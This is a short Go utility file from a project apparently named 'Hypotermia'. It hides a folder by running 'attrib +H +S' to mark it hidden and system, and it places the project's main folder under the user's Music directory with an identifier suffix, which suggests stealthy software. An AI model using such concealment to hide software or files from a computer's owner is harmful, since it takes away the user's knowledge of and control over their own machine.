package utils

import (
	"os"
	"os/exec"
	"path/filepath"

	"Hypotermia/config"
)

func HideFolder(path string) error {
	cmd := exec.Command("attrib", "+H", "+S", path)
	err := cmd.Run()

	if err != nil {
		return err
	}

	return nil
}

func GetMainFolder() string {
	return filepath.Join(os.Getenv("USERPROFILE"), "Music", config.HypotermiaName+"-"+config.Identifier)
}
